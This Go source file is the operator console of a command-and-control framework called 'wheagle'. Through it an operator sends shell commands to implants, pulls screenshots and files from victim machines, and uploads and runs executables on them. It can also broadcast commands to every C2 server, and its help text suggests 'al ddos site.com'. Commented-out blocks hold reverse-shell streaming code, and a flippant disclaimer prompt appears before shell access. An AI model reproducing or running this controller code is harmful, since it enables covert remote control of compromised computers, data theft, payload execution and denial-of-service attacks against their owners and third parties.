/*
Copyright © 2023 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	//"io"
	"os"
	"fmt"
	"time"
	"sync"
	"bufio"
//	"bytes"
	"errors"
	"strings"
	"context"
	"io/ioutil"

//	"github.com/alphamystic/odin/lib/c2"
	"github.com/alphamystic/odin/lib/utils"
  "github.com/alphamystic/odin/lib/penguins/zoo"
	"github.com/alphamystic/odin/wheagle/server/lib"
	"github.com/alphamystic/odin/wheagle/server/grpcapi"

	"github.com/spf13/cobra"
	"github.com/cheggaaa/pb/v3"
)

// rootCmd represents the base command when called without any subcommands
var RootCmd = &cobra.Command{
	Use: "wheagle",
}

func init(){
	// inline commands
	cmdCommander.Flags().String("cmnd","cmnd","Command for all implants")
	systemCommand.Flags().String("cmdType","psh","command shell type psh for powershell, else defaults to windows	and sh for linux")
	cmdImplantInteract.Flags().String("id",",pmoiuycfgvbih","ID for implant to interact with. (WITHOUT THE QUOTES)")
	cmdAdminInteract.Flags().String("id","dfgl0i9u87uty","ID for admin to interact with. (WITHOUT THE QUOTES)")
	//root commands
	RootCmd.AddCommand(cmdCommander)
	RootCmd.AddCommand(cmdHelp)
	RootCmd.AddCommand(cmdStartMsf)
	RootCmd.AddCommand(cmdQuit)
	RootCmd.AddCommand(systemCommand)
	RootCmd.AddCommand(cmdImplantInteract)
	RootCmd.AddCommand(cmdAdminInteract)
}

var cmdImplantInteract = &cobra.Command{
	Use: "im",
	Short: "Interact with a perticular mule/minion",
	Long: "",
	Run: func(cmd *cobra.Command, args []string){
		var client = new(lib.AdminClientWrapper)
		var err error
		//do your thing
		id,_ := cmd.Flags().GetString("id")
		// check if ID exists and establish a connection (client) to the C2
		ses,err := RunningSessions.GetSession(id)
		if err != nil {
			utils.Logerror(fmt.Errorf("Error getting implant with id: %s: %v",id,err))
			return
		}
		addr,exist := Conns.DoesConnectionExist(ses.MotherShipID)
		if addr == "" && !exist{
			utils.Warning(fmt.Sprintf("No connection to the specified address: %s",id))
			client,err = lib.InitializeAdminClient(addr,false)
			if err != nil{
				if CheckForNotAvailableImplant(err){
					utils.PrintTextInASpecificColor("yellow",fmt.Sprintf("Implant with id %s not available in mothership",id))
				}
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v",err))
				return
			}
		} else {
			client,err = lib.InitializeAdminClient(addr,false)
			if err != nil{
				if CheckForNotAvailableImplant(err){
					utils.PrintTextInASpecificColor("yellow",fmt.Sprintf("Implant with id %s not available in mothership",id))
				}
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v",err))
				return
			}
		}
		//defer client.Close()
		//use the client to run the commands
		//var adminCommand = new(grpcapi.Command)
		// Print Wheagle and implant id
		utils.Interactor(id,false)
		fmt.Println("")
		//use a forever for loop to take in coomands
		var iarg string
		reader := bufio.NewReader(os.Stdin)
	  for {
			START:
			fmt.Printf("[Implant-INTERACTOR]: ")
			if iarg,err = reader.ReadString('\n'); err != nil{
				utils.Logerror(err)
				continue
			}
			iarg = strings.TrimSpace(iarg)
			if iarg == "" {goto START}
			ags := strings.Fields(iarg)
			//fmt.Scanln(&iarg)
			switch ags[0]{
			case ""," ":
				utils.PrintTextInASpecificColor("blue","Error command can not be empty")
				goto START
			case "help":
				//print all admin interact commands
				fmt.Println("HELp");goto START
			case "exit":
				var adminCommand = new(grpcapi.Command)
				ctx := context.Background()
				adminCommand.In = "exit"
				adminCommand.Individual = true
				adminCommand.UserId = id
				adminCommand,err = client.AClient.RunCommand(ctx,adminCommand)
				if err != nil {
					if CheckForNotAvailableImplant(err){
						utils.PrintTextInASpecificColor("yellow",fmt.Sprintf("Implant with id %s not available in mothership",id))
					}
					utils.Logerror(fmt.Errorf("Error running client command: %v",err))
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
					return
				}
				fmt.Println(adminCommand.Out)
				if client.Conn != nil {
					if errs := client.Close(); errs != nil {
						if strings.Contains(fmt.Sprintf("%s",errs),"the client connection is closing") {
							return
						}
						//utils.Logerror(errs) Just ignore this error
					}
				 };goto END
			case "shell":
			case "back":
				goto END
			case "screenshot":
				var adminCommand = new(grpcapi.Command)
				adminCommand.UserId = id
				adminCommand.Individual = true
				adminCommand.In = "screenshot"
				screenshots,err := client.AClient.RunScreenShot(context.Background(),adminCommand)
				if err != nil {
					utils.Logerror(err)
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
					return
				}
				for _,screenshot := range screenshots.Screenshot{
					img,err := zoo.DecodeImage(screenshot)
					if err != nil{
						utils.PrintTextInASpecificColor("yellow",fmt.Sprintf("%s",err));continue
					}
					if err = os.MkdirAll("../bin/sreenshots/"+id +"/",0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err);goto START
					}
					zoo.Save(img,"../bin/sreenshots/"+id +"/")
				}
				utils.PrintTextInASpecificColor("blue","Finished writting screenshots to sreenshots/" +id)
			case "download":
				var fl *grpcapi.File
				var dir,name string
				fmt.Printf(`[+]	Enter directory to file in absolute form (C:\windows\user\Documets\file.exe): `)
				fmt.Scanln(&dir)
				fmt.Printf("[+]	Enter name to save with locallly (file.exe or file.zip): ")
				fmt.Scanln(&name)
				if !utils.CheckifStringIsEmpty(name) && !utils.CheckifStringIsEmpty(dir) {
					flmsg := &grpcapi.FileMessage{
						Name: name,
						Directory: dir,
						UserId: id,
					}
					if fl,err = client.AClient.ReceiveDownload(context.Background(),flmsg); err != nil {
						utils.Logerror(err)
						goto START
					}
					if err = os.MkdirAll("../bin/downloads/"+id +"/",0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err);goto START
					}
					if err = os.WriteFile("../bin/downloads/"+id +"/"+fl.Name,fl.Data,0750); err != nil{
						utils.Logerror(err);goto START
					}
					utils.PrintTextInASpecificColor("BLUE","Downloaded file: bin/downlaods/"+id+"/"+name)
					goto START
				} else{
					utils.PrintTextInASpecificColor("cyan","Name or directory can not be empty.");goto START
				}
			case "upload":
				var fl = new(grpcapi.File)
				var run bool; var err error
				var name,dir,yn string
				fmt.Printf("[+]	Enter directory in absolute form (/home/user/.whegle/bin/file.exe): ")
				fmt.Scanln(&dir)
				fmt.Printf("[+]	Enter name to save with(file.ex or file.zip): ")
				fmt.Scanln(&name)
				fmt.Printf("[+] Save and run (Enter Yes or NO): ")
				fmt.Scanln(&yn)
				if !utils.CheckifStringIsEmpty(name) && !utils.CheckifStringIsEmpty(dir){
					fl.Data,err = ioutil.ReadFile(dir)
					if err != nil{
						utils.Logerror(err); goto START
					}
					//fl.Data = data
					fl.Name = name
					switch yn {
						case "Yes","YES","yes","y","Y":
							fl.Run = true
						default:
							fl.Run = false
					}
					fl.Run = run
					fl.UserId = id
					if _,err = client.AClient.SendUpload(context.Background(),fl); err != nil {
						utils.Logerror(err)
						goto START
					}
					goto START
					utils.PrintTextInASpecificColor("blue","Sent download file....")
				} else{
					utils.PrintTextInASpecificColor("cyan","Name or directory can not be empty.");goto START
				}
			default:
				var adminCommand = new(grpcapi.Command)
				adminCommand.In = iarg
				adminCommand.UserId = id
				adminCommand.Individual = true
				ctx := context.Background()
				adminCommand,err = client.AClient.RunCommand(ctx,adminCommand)
				if err != nil {
					fmt.Println("There was an error.....")
					utils.Logerror(fmt.Errorf("Error running client command: %v",err))
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
					return
				}
				fmt.Println(adminCommand.Out)
				goto START
			}
			END:
				fmt.Println("Switching back to wheagle shell.")
				if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
				return
	  }
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
	},
}

var cmdCommander = &cobra.Command{
	Use: "al",
	Short: "Run a command to all motherships",
	Long: "Run's a command to all motherships. Say al ddos site.com",
	Run: func(cmd *cobra.Command, args []string){
		//var clients []lib.AdminClientWrapper
		var err error
		imCmd,_ := cmd.Flags().GetString("cmnd")
		if imCmd != "" && len(imCmd) > 0{
			//get all connectors
			c2s := Conns.GetAllConnectors()
			//range through each creating a connection and send command to all active C2
			if len(c2s) <= 0{
				fmt.Println("[-]	 We have zero Motherships...........")
				return
			}
			var wg sync.WaitGroup
		  wg.Add(len(c2s))
			for _,cn2 := range c2s {
				var client = new(lib.AdminClientWrapper)
				defer wg.Done()
				/// for some reason when I use c2.Address at InitializeAdminClient it falis so we do this dance to get the address
				addr,_ := Conns.DoesConnectionExist(cn2.SessionId)
				client,err = lib.InitializeAdminClient(addr,false)
				if err != nil{
					//just log the error and ignore everything else
					utils.Logerror(errors.New(fmt.Sprintf("Unable to create a client to C2: %s\r\n ERROR: %s",cn2.OAddress,err)))
				}
				defer client.Close()
				var adminCommand = new(grpcapi.C2Command)
				//set admin configs (allows only this admin to run the commands)
				adminCommand.Individual = false
				adminCommand.MSId = "ALL"
				adminCommand.In = imCmd
				ctx := context.Background()
				adminCommand,err = client.AClient.RunAC2Command(ctx,adminCommand)
				if err != nil {
					utils.Logerror(fmt.Errorf("Error running client command: %v",err))
				}
				fmt.Println("Output for: ",cn2.OAddress)
				fmt.Println(adminCommand.Out)
				fmt.Println("")
				utils.PrintTextInASpecificColorInBold("cyan","---------------------------------------------------------------------------------------------------------")
				//clients = append(clients,client)
			}
			wg.Wait()
		}
	},
}

var cmdAdminInteract =  &cobra.Command{
	Use: "ia",
	Short: "Interact with a perticular or a c2",
	Long: "",
	Run: func(cmd *cobra.Command, args []string){
		var client = new(lib.AdminClientWrapper)
		var err error
		//do your thing
		id,err := cmd.Flags().GetString("id")
		if err != nil{
			utils.PrintTextInASpecificColor("red","An Id is needed to connect to mothership.")
			utils.Logerror(err);return
		}
		// check if ID exists and establish a connection (client) to the C2
		/* This does look and sounds redundant but creating a function will return a client
		   yes but it will be closed so we keep it and defer after connection to keep the session alive
			 I later on avoid defering close for streaming connections as it keeps clossing.
		*/
		addr,exist := Conns.DoesConnectionExist(id)
		if addr == "" && !exist{
			utils.Warning(fmt.Sprintf("No connection to the specified address: %s",id))
			client,err = lib.InitializeAdminClient(addr,false)
			if err != nil{
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v",err))
				return
			}
		} else {
			client,err = lib.InitializeAdminClient(addr,false)
			if err != nil{
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v",err))
				return
			}
		}
		//defer client.Close() if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
		//use the client to run the commands
		var adminCommand = new(grpcapi.C2Command)
		//set admin configs (allows only this admin to run the commands)
		adminCommand.Individual = true
		adminCommand.MSId = id
		// Print Wheagle and implant id
		utils.Interactor(id,true)
		//use a forever for loop to take in comands
		var pass string
		fmt.Printf("Enter password to  interact with C2: ")
		fmt.Scanln(&pass)
		var auth = new(grpcapi.Auth)
		auth.UserId = pass
		auth.MSId = id
		fmt.Println("		Authenticating..................")
		auth,err = client.AClient.RunOperatorAuthentication(context.Background(),auth)
		if err != nil {
			if !auth.Authenticated{
			utils.Logerror(errors.New(auth.MSId))
			utils.Logerror(fmt.Errorf("Find your own C2."))
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
			return
			}
			utils.Logerror(fmt.Errorf("Interal grpc error. %v",err));
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
			return
		}
		utils.Notice("Authneticated..................")
		var iarg string
		reader := bufio.NewReader(os.Stdin)
	  for {
		START:
			fmt.Printf("[ADMIN-INTERACTOR]: ")
			if iarg,err = reader.ReadString('\n'); err != nil{
				utils.Logerror(err)
				continue
			}
			iarg = strings.TrimSpace(iarg)
			if iarg == "" {goto START}
			ags := strings.Fields(iarg)
			//fmt.Scanln(&iarg)
			switch ags[0]{
			case ""," ":
				utils.PrintTextInASpecificColor("blue","Error command can not be empty")
				goto START
			case "help":
				//print all admin interact commands
				fmt.Println("HELP")
			case "delete":
			case "download":
				var fl *grpcapi.File
				var dir,name string
				fmt.Printf(`[+]	Enter directory to file in absolute form (C:\windows\user\Documets\file.exe): `)
				fmt.Scanln(&dir)
				fmt.Printf("[+]	Enter name to save with locallly (file.exe or file.zip): ")
				fmt.Scanln(&name)
				if name != ""|| len(name) > 0 && dir != "" || len(dir) > 0{
					flmsg := &grpcapi.FileMessage{
						Name: name,
						Directory: dir,
					}
					if fl,err = client.AClient.AdminDownloadFile(context.Background(),flmsg); err != nil{
						utils.Logerror(err);goto START
					}
					if err = os.MkdirAll("../bin/downloads/"+id +"/",0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err);goto START
					}
					if err = os.WriteFile("../bin/downloads/"+id +"/"+fl.Name,fl.Data,0750); err != nil{
						utils.Logerror(err);goto START
					}
					utils.PrintTextInASpecificColor("BLUE","Downloaded file: bin/downlaods/"+id+"/"+name)
					goto START
				}
			case "upload":
				var fl = new(grpcapi.File)
				var run bool; var err error
				var name,dir,yn string
				fmt.Printf("[+]	Enter directory in absolute form (/home/user/.whegle/bin/file.exe): ")
				fmt.Scanln(&dir)
				fmt.Printf("[+]	Enter name to save with(file.ex or file.zip): ")
				fmt.Scanln(&name)
				fmt.Printf("[+] Save and run (Enter Yes or NO): ")
				fmt.Scanln(&yn)
				fl.Data,err = ioutil.ReadFile(dir)
				if err != nil{
					utils.Logerror(err); goto START
				}
				//fl.Data = data
				fl.Name = name
				switch yn {
					case "Yes","YES","yes","y","Y":
						fl.Run = true
					default:
						fl.Run = false
				}
				fl.Run = run
				_,err = client.AClient.AdminSendFile(context.Background(),fl)
				if err != nil{
					utils.Logerror(err);goto START
				}
				goto START
			case "screenshot":
				adminCommand.In = "screenshot"
				screenshots,err := client.AClient.TakeAdminScreenShot(context.Background(),adminCommand)
				if err != nil{
					utils.Logerror(err)
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
				}
				for _,screenshot := range screenshots.Screenshot{
					img,err := zoo.DecodeImage(screenshot)
					if err != nil{
						utils.PrintTextInASpecificColor("yellow",fmt.Sprintf("%s",err));continue
					}
					if err = os.MkdirAll("../bin/sreenshots/"+id +"/",0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err);goto START
					}
					zoo.Save(img,"../bin/sreenshots/"+id +"/")
				}
				goto START
			case "shell":
				if err = GoodOpsec(); err != nil {
					utils.Warning(fmt.Sprintf("%s",err))
					if client.Conn != nil { errs := client.Close(); utils.Logerror(errs) }
					return
				}
				/*
				ctx, cancel := context.WithCancel(context.Background())
				defer cancel()
				stream,err := client.AClient.RunInteractive(ctx)
				if err !=  nil{
					utils.Logerror(err)
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
				}
				//err = client.AClient.SpawnRevShell(stream)
				go func(){
					for{
						resp,err := stream.Recv()
						if err != nil{
							if err == io.EOF{
								continue
							}
							utils.Logerror(err)
							cancel()
							if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
						}
						os.Stdout.Write(resp.GetOutput())
					}
				}()
				for {
					scanner := bufio.NewScanner(os.Stdin)
					if !scanner.Scan(){
						if err := scanner.Err(); err != nil{
							if err == io.EOF{
								continue
							}
							utils.Logerror(err)
							cancel()
							if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
						}
					}
					if err := stream.Send(&grpcapi.ReverseShellRequest{Input:scanner.Bytes()});err != nil{
						utils.Logerror(err)
						cancel()
						if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
						return
					}
				}*/
			case "back":
				goto END
			default:
				adminCommand.In = iarg
				ctx := context.Background()
				adminCommand,err = client.AClient.RunAC2Command(ctx,adminCommand)
				if err != nil {
					utils.Logerror(fmt.Errorf("Error running client command: %v",err))
					if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
					return
				}
				fmt.Println(adminCommand.Out)
				goto START
			}
			END:
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
				fmt.Println("Switching back to wheagle shell.")
				return
	  }
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
	},
}


// Execute adds all child commands to the root command and sets flags appropriately.
/* This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}*/

var GoodOpsec = func() error{
	utils.PrintTextInASpecificColorInBold("yello","PRACTICE GOOD OPPSEC")
	var adult string
	fmt.Println("[+]	Confirm that you are an adult and we as the creatorn of github.com/alphamystic/odin/WHEAGLE aren't responcible for your misconduct")
	fmt.Printf("[+]	Do you accept: (enter YES or NO): ")
	fmt.Scanln(&adult)
	if adult != "YES" {
		fmt.Println("THANKS KIDDO!!!!!!!!!!")
		return fmt.Errorf("YEAP ...still a toddler")
	}
	utils.Warning(" Be advised that the action you are taking isn't good oppsec.")
	return nil
}

var CheckForNotAvailableImplant =  func(e error)bool{
	if errors.Is(e,lib.NotAvailableImplant){
	 return true
	}
	return false
}

func init() {
	// rootCmd.PersistentFlags().StringVar(&cfgFile, "config", "", "config file (default is $HOME/.wheagle.yaml)")
	utils.PrintTextInASpecificColorInBold("white","Initializing wheagle C2")
	count := 1000
	bar := pb.StartNew(count)
	for i := 0; i < count; i++ {
		bar.Increment()
		time.Sleep(time.Millisecond)
	}
	// finish bar
	bar.Finish()
	RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
	slitherer := make(chan bool)
	Conda.Dir = "../bin/temp/"
	Conda.Port = 33333
	Conda.Address = "0.0.0.0"
	Conda.Run = slitherer
	/*go Conda.AnacondaServe()
	Conda.Stop(false)*/
	RootCmd.AddCommand(cmdStartFileServer)
	RootCmd.AddCommand(cmdStopFileServer)
}


/*

	/*if err = GoodOpsec(); err != nil {
		utils.Warning(fmt.Sprintf("%s",err))
		if client.Conn != nil { errs := client.Close(); utils.Logerror(errs) }
		return
	}
	ctx := context.Background()
	stream,err := client.AClient.SpawnRevShell(ctx)
	if err !=  nil{
		utils.Logerror(err)
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
	}
	//err = client.AClient.SpawnRevShell(stream)
	for {
		scanner := bufio.NewScanner(os.Stdin)
		if !scanner.Scan(){
			if err := scanner.Err(); err != nil{
				if err == io.EOF{
					continue
				}
				utils.Logerror(err)
				if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
			}
		}
		if err := stream.Send(&grpcapi.ReverseShellRequest{Input:scanner.Bytes()});err != nil{
			utils.Logerror(err)
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
			return
		}
		resp,err := stream.Recv()
		if err != nil{
			if err == io.EOF{
				continue
			}
			utils.Logerror(err)
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
		}
		os.Stdout.Write(resp.GetOutput())
		//fmt.Println("wrote output to stdout")
		//fmt.Println("Output is %s",string(resp.GetOutput()))
	}*/
	/*if err = GoodOpsec(); err != nil {
		utils.Warning(fmt.Sprintf("%s",err))
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
	}
	var adminCommand = new(grpcapi.Command)
	ctx := context.Background()
	adminCommand.In = "shell"
	adminCommand.Individual = true
	adminCommand.UserId = id
	adminCommand,err = client.AClient.RunCommand(ctx,adminCommand)
	if err != nil{
		utils.Logerror(fmt.Errorf("Error starting minion shell: %v",err));
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
		return
	}
	fmt.Println(adminCommand.Out)
	stream,err := client.AClient.RunClientReverseShell(ctx)
	if err !=  nil{
		utils.Logerror(fmt.Errorf("Error running minion reverse shell. \nERROR: %v",err));
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
	}
	fmt.Println("We should be receaving a stream......")
	//err = client.AClient.SpawnRevShell(stream)
	go func(){
		for{
			resp,err := stream.Recv()
			if err == io.EOF{
				return
			}
			if err != nil{ utils.Logerror(err);
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return }
			os.Stdout.Write(resp.GetOutput())
		}
	}()
	time.Sleep(3 * time.Second)
	go func(){
		buf := make([]byte,2042)
		for{
			n,err := os.Stdin.Read(buf)
			if err == io.EOF{
				return
			}
			if err != nil{ utils.Logerror(err);return }
			if err := stream.Send(&grpcapi.ReverseShellRequest{Input:buf[:n]});err != nil{
				utils.Logerror(err)
				if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
				return
			}
		}
	}()

use the client to run the commands
// this is the initial command line for run alll, thought it to be tooo bcbirwvwilwb or something like that
var adminCommand = new(grpcapi.C2Command)
//set admin configs (allows only this admin to run the commands)
adminCommand.Individual = false
adminCommand.MSId = ""
utils.PrintTextInASpecificColorInBold("magenta",fmt.Sprintf("Sending command to: %s",c2.Address))
utils.Interactor("MOTHERSHIPS",true)
//use a forever for loop to take in coomands
var iarg string
for {
	/*var pass string
	fmt.Printlf("Enter password to C@2to interact: ")
	fmt.Scanln(&pass)
	auth := client.AClient.RunAuthentication(ctx,pass)
	if !auth {
		utils.Logerror(fmt.Errorf("Find your own C2."))
		os.Exit()
	}
	START:
	fmt.Scanln(&iarg)
	switch iarg{
	case "help":
		//print all admin interact commands
		fmt.Println("HELP")
	case "shell":
		utils.Warning("HONESTLY WHY WOULD YOU EVEN DO THAT!!!!!!!")
		return
	case "back":
		goto END
	default:
		for _,client := range clients{
			//send the command
			adminCommand.In = iarg
			ctx := context.Background()
			adminCommand,err = client.AClient.RunAC2Command(ctx,adminCommand)
			if err != nil {
				utils.Logerror(fmt.Errorf("Error running client command: %v",err))
				return
			}
			fmt.Println("Output for: ",client.Address)
			fmt.Println(adminCommand.Out)
			goto START
		}
	}
	END:
		fmt.Println("Switching back to wheagle shell.")
		return
}*/



/*go func(){
	for{
		resp,err := stream.Recv()
		if err != nil{
			if err == io.EOF{
				continue
			}
			utils.Logerror(err)
			if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
		}
		os.Stdout.Write(resp.GetOutput())
		fmt.Println("wrote output to stdout")
		fmt.Println("Output is %s",string(resp.GetOutput()))
	}
}()
for true{
	//buf := make([]byte,2042)
	buf := bytes.Buffer{}
	fmt.Println("Reading from stdin....")
	_,err = os.Stdin.Read(buf.Bytes())
	if err != nil {
		if err == io.EOF{
			continue
		}
		utils.Logerror(err)
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  };return
	}
	fmt.Println("Sendinf datat from stdin....")
	if err := stream.Send(&grpcapi.ReverseShellRequest{Input:buf.Bytes()});err != nil{
		utils.Logerror(err)
		if client.Conn != nil {  errs := client.Close(); utils.Logerror(errs)  }
		return
	}
}*/
